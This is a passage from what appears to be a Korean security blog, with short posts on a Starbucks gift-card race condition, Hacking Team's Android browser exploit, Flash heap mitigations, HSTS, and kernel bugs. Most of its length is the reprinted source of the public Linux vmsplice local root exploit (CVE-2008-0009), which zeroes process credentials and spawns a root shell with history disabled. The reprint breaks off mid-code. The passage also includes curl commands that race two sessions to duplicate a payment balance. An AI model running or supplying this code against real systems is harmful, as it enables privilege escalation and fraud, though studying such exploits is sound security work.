</span><span class='line'>curl starbucks/step2confirm -H Cookie: session=session1 & curl starbucks/step2?confirm -H Cookie: session=session2</span></code></pre></td></tr></table></div></figure>


<p>세션 2 개를 만들어서 대여섯번 시도하니, 돈이 복사가 되었다고 한다. 게임에 많이 나오는 돈복사 버그.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/17/hacking-teams-android-browser-exploit/">Hacking Team's Android Browser Exploit</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-17T17:20:22+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:20 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Tencent 보안팀의 <a href="https://translate.google.com/translate?sl=zh-CN&amp;tl=en&amp;js=y&amp;prev=_t&amp;hl=en&amp;ie=UTF-8&amp;u=http%3A%2F%2Fsecurity.tencent.com%2Findex.php%2Fblog%2Fmsg%2F87&amp;edit-text=">Hacking Team Android Browser Exploit</a> 을 요약해본다.</p>

<p><code>vector-exploit-master\src\ht-webkit-Android4-src</code> 디렉토리에 Android Browser exploit 코드가 있다.</p>

<ul>
<li>Information leak (CVE-2011-1202)</li>
<li>Arbitrary Memory Read (CVE-2012-2825)</li>
<li>Heap-Buffer-Overflow (CVE-2012-2871)</li>
</ul>


<p>을 사용한다.</p>

<h4>map_pages(Layout, num)</h4>

<h4>createsheetblob(addr)</h4>

<h4>start_bisect() / find_spray_addr()</h4>

<h4>CVE-2011-1202</h4>

<h4>XSLTObject.prototype.free</h4>

<h4>Overwrite ArrayBuffer</h4>

<h4>BufferMemoryObject.write32()</h4>

<h4>module.so</h4>

<h4>libwebcore.so / libc.so</h4>

<h4>fakevtable</h4>

<h4>ROP</h4>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/17/significant-flash-exploit-mitigations-are-live-in-v18-dot-0-0-dot-209/">Significant Flash Exploit Mitigations Are Live in v18.0.0.209</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-17T15:38:05+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:38 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Project Zero 의 Flash mitigation 에 관한 글을 요약 정리해본다.</p>

<p>이번에 버전업된 18.0.0.209 의 경우.</p>

<p><a href="http://googleprojectzero.blogspot.kr/2015/07/significant-flash-exploit-mitigations_16.html">Significant Flash exploit mitigations are live v18.0.0.209</a></p>

<h4>최근의 Flash exploit 경향</h4>

<p>heap 에서 앞쪽의 버퍼를 overflow 시켜서, 뒤쪽에 위치한 <code>Vector.&lt;uint&gt;</code> 를 overwrite 한다. <code>Vector.&lt;uint&gt;</code> 의 앞 4 바이트는 <code>length</code> 이다. 이 <code>length</code> 를 무지하게 큰 수로 만들어서 메모리 대부분을 read/write 할 수 있는 list 를 만든다.</p>

<p>또는 use-after-free 를 이용해서 <code>Vector.&lt;uint&gt;</code> 의 <code>length</code> 를 overwrite 한다. ByteArray 로 heap chunk 를 pointing 하게 셋업하고, free 시키고 <code>Vector.&lt;uint&gt;</code> 를 그 자리에 alloc 하고, 앞서 만든 ByteArray pointer 를 사용해 memory write 를 만들어낸다. 원래 heap chunk 는 free 되버리고, 이상한 녀석이 그 자리에 들어와있는데, memory write 가 일어나니, <code>Vector.&lt;uint&gt;</code> 의 <code>length</code> 에 write 가 일어나버리고, 역시 마찬가지로 <code>length</code> 가 무지하게 커져버린 전천후 list 가 만들어진다.</p>

<p>최근 공개된 Hacking Team 의 Flash 0day 들도 비슷한 use-after-free 방식.</p>

<h4>Mitigation: <code>Vector.&lt;uint&gt;</code> buffer heap partitioning</h4>

<p>Adobe Flash 18.0.0.209 에서는 Heap partitioning 을 도입했다. <code>Vector.&lt;uint&gt;</code> 가 alloc 되는 heap 을 별도로 마련한것.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_bigVec = new Vector.&lt;uint&gt;;
</span><span class='line'>_bigVec.length = ((512 * 1024 * 1024) - 500) / 4;
</span><span class='line'>_bigVec[0] = 0xf2f2f2f2;
</span><span class='line'>_bigArr = new ByteArray();
</span><span class='line'>_bigArr.length = 512 * 1024 * 1024;
</span><span class='line'>_bigArr[0] = 0xf1;</span></code></pre></td></tr></table></div></figure>


<p>을 해서, 프로세스 메모리 맵을 보면 <code>_bigVec</code> 과 <code>_bigArr</code> 는 꽤 떨어진 영역에 위치하게 된다.</p>

<h4>Mitigations: stronger randomization for the Flash heap</h4>

<h4>Mitigations: <code>Vector.&lt;*&gt;</code> length validation</h4>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/17/http-strict-transport-security/">HTTP Strict Transport Security</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-17T15:04:07+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:04 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>HTTP Strict Transport Security</h4>

<p>HSTS 를 안쓰면, HTTP -> 301 Moved Permanently -> HTTPS 로 바꿔야한다.</p>

<p>HSTS 를 쓰면, HTTP -> 307 Internal Redirect -> HTTPS 로 간다.</p>

<p>HSTS 의 경우 Chrome 이 request 조차 보내지 않는다.</p>

<p><code>Strict-Transport-Security: max-age=31536000; includeSubdomains; preload</code> 와 같은 헤더때문인데.</p>

<p>웹사이트가 HSTS 인지 아닌지 처음엔 모르기때문에, 첫 커넥션까지 HTTPS 로 가게 하려면,</p>

<p><a href="https://hstspreload.appspot.com">https://hstspreload.appspot.com</a> 에 등록해야한다.</p>

<h4>HTTP Public Key Pinning</h4>

<p>HTTP Public Key Pinning 의 경우도 중요한 기술.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/13/agtke-attacking-the-core/">AGTKE: Attacking the Core</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-13T10:07:33+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:07 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>FreeBSD 8.0 &lsquo;Assigning values to uninitialized pointer&rsquo;</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct ucred ucred, *ucp;
</span><span class='line'>...
</span><span class='line'>refcount_init(&ucred.cr_ref, 1);
</span><span class='line'>ucred.cr_uid = ip-&gt;i_uid;
</span><span class='line'>ucred.cr_ngroups = 1;
</span><span class='line'>ucred.cr_groups[0] = dp-&gt;i_gid; 
</span><span class='line'>ucp = &ucred;</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct ucred {
</span><span class='line'>    u_int cr_ref;
</span><span class='line'>    ...
</span><span class='line'>    gid_t *cr_groups;
</span><span class='line'>    int cr_agroups;
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>ucred 는 스택에 alloc 되는데, 적절히 init 안하고, ucred.cr_groups[0] 에 writing 을 한다. 전에 불렸던 펑션콜의 스택 사용에 따라서 ucred.cr_groups 의 값이 바뀌게 된다.</p>

<h4>Linux vmsplice_to_user()</h4>

<ul>
<li>Linux kernel 2.6.17 - 2.6.24.1</li>
<li><a href="http://www.gossamer-threads.com/lists/linux/kernel/876580">CVE-2008-0009</a></li>
<li><a href="http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/fs/splice.c?v=2.6.25">Patched src</a></li>
<li><a href="http://www.exploit-db.com/exploits/5092/">vmsplice exploit-db</a></li>
<li><a href="http://colesec.inventedtheinternet.com/tag/cve-2008-0009/">ColeSec</a></li>
<li><a href="http://www.reddit.com/r/netsec/comments/1eb9iw/sdfucksheeporgs_semtexc_local_linux_root_exploit/">semtex reddit thread</a></li>
</ul>


<p>base 는 user space 에서 온 값인데, <code>sd.u.userptr</code> 로 갔다가 __copy_to_user_inatomic() 이라는 write 함수로 흘러버린다. kernel 주소를 kernel 에 넘겨서, kernel memory write 를 하는 취약점.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>error = get_user(base, &iov-&gt;iov_base); // get_user 는 매크로라 &base 할 필요가 없다.
</span><span class='line'>...
</span><span class='line'>if (unlikely(!base)) {
</span><span class='line'>    error = -EFAULT;
</span><span class='line'>    break;
</span><span class='line'>}
</span><span class='line'>...
</span><span class='line'>sd.u.userptr = base;
</span><span class='line'>...
</span><span class='line'>size = __splice_from_pipe(pipe, &sd, pipe_to_user);
</span><span class='line'>...
</span><span class='line'>static int pipe_to_user(struct pipe_inode_info *pipe, struct pipe_buffer *buf,
</span><span class='line'>struct splice_desc *sd)
</span><span class='line'>{
</span><span class='line'>if (!fault_in_pages_writeable(sd-&gt;u.userptr, sd-&gt;len)) {
</span><span class='line'>    src = buf-&gt;ops-&gt;map(pipe, buf, 1);
</span><span class='line'>    ret = __copy_to_user_inatomic(sd-&gt;u.userptr, src+buf-&gt;offset, sd-&gt;len);
</span><span class='line'>    buf-&gt;ops-&gt;unmap(pipe, buf, src);
</span><span class='line'>...
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>exploit.c</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define _GNU_SOURCE
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;errno.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>#include &lt;malloc.h&gt;
</span><span class='line'>#include &lt;limits.h&gt;
</span><span class='line'>#include &lt;signal.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;sys/uio.h&gt;
</span><span class='line'>#include &lt;sys/mman.h&gt;
</span><span class='line'>#include &lt;asm/page.h&gt;
</span><span class='line'>#define __KERNEL__
</span><span class='line'>#include &lt;asm/unistd.h&gt;
</span><span class='line'> 
</span><span class='line'>#define PIPE_BUFFERS    16
</span><span class='line'>#define PG_compound 14
</span><span class='line'>#define uint        unsigned int
</span><span class='line'>#define static_inline   static inline __attribute__((always_inline))
</span><span class='line'>#define STACK(x)    (x + sizeof(x) - 40)
</span><span class='line'> 
</span><span class='line'>struct page {
</span><span class='line'>    unsigned long flags;
</span><span class='line'>    int count;
</span><span class='line'>    int mapcount;
</span><span class='line'>    unsigned long private;
</span><span class='line'>    void *mapping;
</span><span class='line'>    unsigned long index;
</span><span class='line'>    struct { long next, prev; } lru;
</span><span class='line'>};
</span><span class='line'> 
</span><span class='line'>void    exit_code();
</span><span class='line'>char    exit_stack[1024 * 1024];
</span><span class='line'> 
</span><span class='line'>void    die(char *msg, int err)
</span><span class='line'>{
</span><span class='line'>    printf(err ? "[-] %s: %s\n" : "[-] %s\n", msg, strerror(err));
</span><span class='line'>    fflush(stdout);
</span><span class='line'>    fflush(stderr);
</span><span class='line'>    exit(1);
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>#if defined (__i386__)
</span><span class='line'> 
</span><span class='line'>#ifndef __NR_vmsplice
</span><span class='line'>#define __NR_vmsplice   316
</span><span class='line'>#endif
</span><span class='line'> 
</span><span class='line'>#define USER_CS     0x73
</span><span class='line'>#define USER_SS     0x7b
</span><span class='line'>#define USER_FL     0x246
</span><span class='line'> 
</span><span class='line'>static_inline
</span><span class='line'>void    exit_kernel()
</span><span class='line'>{
</span><span class='line'>    __asm__ __volatile__ (
</span><span class='line'>    "movl %0, 0x10(%%esp) ;"
</span><span class='line'>    "movl %1, 0x0c(%%esp) ;"
</span><span class='line'>    "movl %2, 0x08(%%esp) ;"
</span><span class='line'>    "movl %3, 0x04(%%esp) ;"
</span><span class='line'>    "movl %4, 0x00(%%esp) ;"
</span><span class='line'>    "iret"
</span><span class='line'>    : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
</span><span class='line'>        "i" (USER_CS), "r" (exit_code)
</span><span class='line'>    );
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>static_inline
</span><span class='line'>void *  get_current()
</span><span class='line'>{
</span><span class='line'>    unsigned long curr;
</span><span class='line'>    __asm__ __volatile__ (
</span><span class='line'>    "movl %%esp, %%eax ;"
</span><span class='line'>    "andl %1, %%eax ;"
</span><span class='line'>    "movl (%%eax), %0"
</span><span class='line'>    : "=r" (curr)
</span><span class='line'>    : "i" (~8191)
</span><span class='line'>    );
</span><span class='line'>    return (void *) curr;
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>#elif defined (__x86_64__)
</span><span class='line'> 
</span><span class='line'>#ifndef __NR_vmsplice
</span><span class='line'>#define __NR_vmsplice   278
</span><span class='line'>#endif
</span><span class='line'> 
</span><span class='line'>#define USER_CS     0x23
</span><span class='line'>#define USER_SS     0x2b
</span><span class='line'>#define USER_FL     0x246
</span><span class='line'> 
</span><span class='line'>static_inline
</span><span class='line'>void    exit_kernel()
</span><span class='line'>{
</span><span class='line'>    __asm__ __volatile__ (
</span><span class='line'>    "swapgs ;"
</span><span class='line'>    "movq %0, 0x20(%%rsp) ;"
</span><span class='line'>    "movq %1, 0x18(%%rsp) ;"
</span><span class='line'>    "movq %2, 0x10(%%rsp) ;"
</span><span class='line'>    "movq %3, 0x08(%%rsp) ;"
</span><span class='line'>    "movq %4, 0x00(%%rsp) ;"
</span><span class='line'>    "iretq"
</span><span class='line'>    : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
</span><span class='line'>        "i" (USER_CS), "r" (exit_code)
</span><span class='line'>    );
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>static_inline
</span><span class='line'>void *  get_current()
</span><span class='line'>{
</span><span class='line'>    unsigned long curr;
</span><span class='line'>    __asm__ __volatile__ (
</span><span class='line'>    "movq %%gs:(0), %0"
</span><span class='line'>    : "=r" (curr)
</span><span class='line'>    );
</span><span class='line'>    return (void *) curr;
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>#else
</span><span class='line'>#error "unsupported arch"
</span><span class='line'>#endif
</span><span class='line'> 
</span><span class='line'>#if defined (_syscall4)
</span><span class='line'>#define __NR__vmsplice  __NR_vmsplice
</span><span class='line'>_syscall4(
</span><span class='line'>    long, _vmsplice,
</span><span class='line'>    int, fd,
</span><span class='line'>    struct iovec *, iov,
</span><span class='line'>    unsigned long, nr_segs,
</span><span class='line'>    unsigned int, flags)
</span><span class='line'> 
</span><span class='line'>#else
</span><span class='line'>#define _vmsplice(fd,io,nr,fl)  syscall(__NR_vmsplice, (fd), (io), (nr), (fl))
</span><span class='line'>#endif
</span><span class='line'> 
</span><span class='line'>static uint uid, gid;
</span><span class='line'> 
</span><span class='line'>void    kernel_code()
</span><span class='line'>{
</span><span class='line'>    int i;
</span><span class='line'>    uint    *p = get_current();
</span><span class='line'> 
</span><span class='line'>    for (i = 0; i &lt; 1024-13; i++) {
</span><span class='line'>        if (p[0] == uid && p[1] == uid &&
</span><span class='line'>            p[2] == uid && p[3] == uid &&
</span><span class='line'>            p[4] == gid && p[5] == gid &&
</span><span class='line'>            p[6] == gid && p[7] == gid) {
</span><span class='line'>            p[0] = p[1] = p[2] = p[3] = 0;
</span><span class='line'>            p[4] = p[5] = p[6] = p[7] = 0;
</span><span class='line'>            p = (uint *) ((char *)(p + 8) + sizeof(void *));
</span><span class='line'>            p[0] = p[1] = p[2] = ~0;
</span><span class='line'>            break;
</span><span class='line'>        }
</span><span class='line'>        p++;
</span><span class='line'>    }   
</span><span class='line'> 
</span><span class='line'>    exit_kernel();
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>void    exit_code()
</span><span class='line'>{
</span><span class='line'>    if (getuid() != 0)
</span><span class='line'>        die("wtf", 0);
</span><span class='line'> 
</span><span class='line'>    printf("[+] root\n");
</span><span class='line'>    putenv("HISTFILE=/dev/null");
</span><span class='line'>    execl("/bin/bash", "bash", "-i", NULL);
</span><span class='line'>    die("/bin/bash", errno);
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>int main(int argc, char *argv[])
</span><span class='line'>{
</span><span class='line'>    int     pi[2];
</span><span class='line'>    size_t      map_size;
</span><span class='line'>    char *      map_addr;
</span><span class='line'>    struct iovec    iov;
</span><span class='line'>    struct page *   pages[5];
</span><span class='line'> 
</span><span class='line'>    uid = getuid();
</span><span class='line'>    gid = getgid();
</span><span class='line'>    setresuid(uid, uid, uid);
</span><span class='line'>    setresgid(gid, gid, gid);
</span><span class='line'> 
</span><span class='line'>    printf("-----------------------------------\n");
</span><span class='line'>    printf(" Linux vmsplice Local Root Exploit\n");
</span><span class='line'>    printf(" By qaaz\n");
</span><span class='line'>    printf("-----------------------------------\n");
</span><span class='line'> 
</span><span class='line'>    if (!uid || !gid)
</span><span class='line'>        die("!@#$", 0);
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    pages[0] = *(void **) &(int[2]){0,PAGE_SIZE};
</span><span class='line'>    pages[1] = pages[0] + 1;
</span><span class='line'> 
</span><span class='line'>    map_size = PAGE_SIZE;
</span><span class='line'>    map_addr = mmap(pages[0], map_size, PROT_READ | PROT_WRITE,
</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
</span><span class='line'>    if (map_addr == MAP_FAILED)
</span><span class='line'>        die("mmap", errno);
</span><span class='line'> 
</span><span class='line'>    memset(map_addr, 0, map_size);
</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[0]);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[1]);
</span><span class='line'> 
</span><span class='line'>    pages[0]-&gt;flags    = 1 &lt;&lt; PG_compound;
</span><span class='line'>    pages[0]-&gt;private  = (unsigned long) pages[0];
</span><span class='line'>    pages[0]-&gt;count    = 1;
</span><span class='line'>    pages[1]-&gt;lru.next = (long) kernel_code;
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    pages[2] = *(void **) pages[0];
</span><span class='line'>    pages[3] = pages[2] + 1;
</span><span class='line'> 
</span><span class='line'>    map_size = PAGE_SIZE;
</span><span class='line'>    map_addr = mmap(pages[2], map_size, PROT_READ | PROT_WRITE,
</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
</span><span class='line'>    if (map_addr == MAP_FAILED)
</span><span class='line'>        die("mmap", errno);
</span><span class='line'> 
</span><span class='line'>    memset(map_addr, 0, map_size);
</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[2]);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[3]);
</span><span class='line'> 
</span><span class='line'>    pages[2]-&gt;flags    = 1 &lt;&lt; PG_compound;
</span><span class='line'>    pages[2]-&gt;private  = (unsigned long) pages[2];
</span><span class='line'>    pages[2]-&gt;count    = 1;
</span><span class='line'>    pages[3]-&gt;lru.next = (long) kernel_code;
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    pages[4] = *(void **) &(int[2]){PAGE_SIZE,0};
</span><span class='line'>    map_size = PAGE_SIZE;
</span><span class='line'>    map_addr = mmap(pages[4], map_size, PROT_READ | PROT_WRITE,
</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
</span><span class='line'>    if (map_addr == MAP_FAILED)
</span><span class='line'>        die("mmap", errno);
</span><span class='line'>    memset(map_addr, 0, map_size);
</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[4]);
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    map_size = (PIPE_BUFFERS * 3 + 2) * PAGE_SIZE;
</span><span class='line'>    map_addr = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
</span><span class='line'>                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
</span><span class='line'>    if (map_addr == MAP_FAILED)
</span><span class='line'>        die("mmap", errno);
</span><span class='line'> 
</span><span class='line'>    memset(map_addr, 0, map_size);
</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    map_size -= 2 * PAGE_SIZE;
